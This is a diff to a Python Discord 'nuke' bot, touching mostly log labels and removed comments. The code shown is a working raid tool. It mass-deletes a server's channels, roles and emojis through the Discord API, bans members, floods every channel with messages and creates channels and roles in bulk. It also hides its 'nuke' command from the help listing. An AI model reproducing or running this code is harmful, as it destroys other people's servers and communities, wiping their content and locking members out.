@@ -47,7 +47,6 @@ class Help(commands.HelpCommand):
 		for cog, commands in mapping.items():
 			filtered = await self.filter_commands(commands, sort=True)
 			for c in filtered:
-				# command_signatures = [self.get_command_signature(c) for c in filtered]
 				if str(c) != 'nuke':
 					command_signatures.append(self.get_command_signature(c))
 
@@ -131,21 +130,15 @@ async def on_ready():
 	"""
 	print("\x1B[38;2;41;128;185m"+__BANNER__+"\x1B[37m")
 	print(__PANEL_INFO__)
-	# cmd = input("::Command:: ")
-	# if cmd.startwith("nuke"):
-	# 	_cmd = cmd.split(" ")
-
 
 def consoleLog(message, print_success=True, print_time=True):
 	if True:
 		TIME = ''
 		if print_time:
 			TIME = f'[{time.strftime("%H:%M:%S", time.localtime())}] '
-			# TIME = Colorate.Horizontal(Colors.rainbow, TIME)
 			TIME = Fore.GREEN + TIME
 		if print_success:
 			try:
-				# print(f'{TIME}{Colorate.Horizontal(Colors.yellow_to_red, message)}')
 				print(f'{TIME}{Fore.GREEN}{message}')
 			except TypeError:
 				sys.stdout.buffer.write(f'{TIME}{Colorate.Horizontal(Colors.yellow_to_red, message)}'.encode('utf8'))
@@ -155,7 +148,7 @@ def consoleLog(message, print_success=True, print_time=True):
 			except TypeError:
 				sys.stdout.buffer.write(f'{TIME}{Fore.RED}{message}'.encode('utf8'))
 
-#		::: NUKE :::	#
+#	::: NUKE :::	#
 
 async def CreateChannels(ctx, n, name):
 	name = __CHANNEL_NAME__ if name is None else name
@@ -167,25 +160,24 @@ async def CreateChannels(ctx, n, name):
 	for i in range(n):
 		try:
 			q.put((requests.post, f'https://discord.com/api/v8/guilds/{ctx.guild.id}/channels', headers, payload))
-			consoleLog(f"[ChannelsCreater] Successfully Made Channel {name}!", True)
+			consoleLog(f"[ChannelsCreate] Successfully Made Channel {name}!", True)
 		except:
-			consoleLog(f"[ChannelsCreater] Unable To Create Channel!", False)
+			consoleLog(f"[ChannelsCreate] Unable To Create Channel!", False)
 	q.join()
 
 async def DeleteChannels(Channels):
 	for Channel in Channels:
 		q.put((requests.delete, f'https://discord.com/api/v8/channels/{Channel.id}', headers, None))
-		consoleLog(f"[ChannelsDelater] {Channel.name} Has Been Successfully Deleted!")
+		consoleLog(f"[ChannelsDelete] {Channel.name} Has Been Successfully Deleted!")
 	q.join()
 
 async def DeleteRoles(ctx):
 	for role in ctx.guild.roles:
 		try:
-			# await role.delete()
 			q.put((requests.delete, f'https://discord.com/api/v10/guilds/{ctx.guild.id}/roles/{role.id}', headers, None))
-			consoleLog(f"[RolesDeleter] Role {role.name} Has Been Successfully Deleted!")
+			consoleLog(f"[RolesDelete] Role {role.name} Has Been Successfully Deleted!")
 		except:
-			consoleLog(f"[RolesDeleter] Role {role.name} Unble To Deleted!", False)
+			consoleLog(f"[RolesDelete] Role {role.name} Unble To Deleted!", False)
 	q.join()
 
 async def CreateRole(ctx, n, name):
@@ -196,18 +188,18 @@ async def CreateRole(ctx, n, name):
 	for i in range(n):
 		try:
 			q.put((requests.post, f'https://discord.com/api/v10/guilds/{ctx.guild.id}/roles', headers, payload))
-			consoleLog(f"[RolesCreater] Successfully Created Role {name} In {ctx.guild.name}!")
+			consoleLog(f"[RolesCreate] Successfully Created Role {name} In {ctx.guild.name}!")
 		except:
-			consoleLog(f"[RolesCreater] Unable To Create Roles {name} In {ctx.guild.name}!", False)
+			consoleLog(f"[RolesCreate] Unable To Create Roles {name} In {ctx.guild.name}!", False)
 	q.join()
 
 async def DeleteEmoji(ctx):
 	for emoji in ctx.guild.emojis:
 		try:
 			q.put((requests.delete, f'https://discord.com/api/v8/guilds/{ctx.guild.id}/emojis/{emoji.id}', headers, None))
-			consoleLog(f"[EmojisDeleter] Successfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
+			consoleLog(f"[EmojisDelete] Successfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
 		except:
-			consoleLog(f"[EmojisDeleter] Unable To Delete Emoji {emoji.name} In {ctx.guild.name}!", False)
+			consoleLog(f"[EmojisDelete] Unable To Delete Emoji {emoji.name} In {ctx.guild.name}!", False)
 	q.join()
 
 async def BanAll(ctx):
@@ -241,15 +233,15 @@ async def SendMessage(ctx = None, _channel = None):
 			for channel in ctx.guild.channels:
 				try:
 					q.put((requests.post, f'https://discord.com/api/v8/channels/{channel.id}/messages', headers, payload))
-					consoleLog(f"[MessageSender] Send {msg} Message!")
+					consoleLog(f"[MessageSend] Send {msg} Message!")
 				except:
-					consoleLog(f"[MessageSender] Unble to send {msg} Message!", False)
+					consoleLog(f"[MessageSend] Unble to send {msg} Message!", False)
 		else:
 			try:
 				q.put((requests.post, f'https://discord.com/api/v8/channels/{_channel.id}/messages', headers, payload))
-				consoleLog(f"[MessageSender] Send {msg} Message!")
+				consoleLog(f"[MessageSend] Send {msg} Message!")
 			except:
-				consoleLog(f"[MessageSender] Unble to send {msg} Message!", False)
+				consoleLog(f"[MessageSend] Unble to send {msg} Message!", False)
 	q.join()
 
 @client.command(aliases=[__ALIASES_NUKE__])
@@ -279,9 +271,9 @@ async def delChannels(ctx):
 	for channel in ctx.guild.channels:
 		try:
 			q.put((requests.delete, f'https://discord.com/api/v8/channels/{channel.id}', headers, None))
-			consoleLog(f"[ChannelsDelater] {channel.name} Has Been Successfully Deleted!")
+			consoleLog(f"[ChannelsDelete] {channel.name} Has Been Successfully Deleted!")
 		except:
-			consoleLog(f"[ChannelsDelater] {channel.name} Unble to Deleted!", False)
+			consoleLog(f"[ChannelsDelete] {channel.name} Unble to Deleted!", False)
 			continue
 	q.join()
 
@@ -289,7 +281,7 @@ async def delChannels(ctx):
 async def changesStatus(ctx, status):
 	if ctx.message.author.id == __USER_ID__:
 		await client.change_presence(status = GetStatus(status), activity=discord.Game(name= f"{__PREFIX__}{__ALIASES_NUKE__}"))
-		consoleLog(f"[StatusChannger] Change Status to {status}")
+		consoleLog(f"[StatusChannge] Change Status to {status}")
 	else:
 		ctx.send(f'{ctx.message.author.name} You are not the owner of me!')
 
@@ -298,7 +290,7 @@ async def changesStatus(ctx, status):
 
 @client.command()
 async def getChannelID(ctx):
-	r = requests.get(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/channels", headers = headers)
+	r = requests.get(f"https://discord.com/api/v8/guilds/{ctx.guild.id}/channels", headers = headers)
 	print(r.text)
 
 
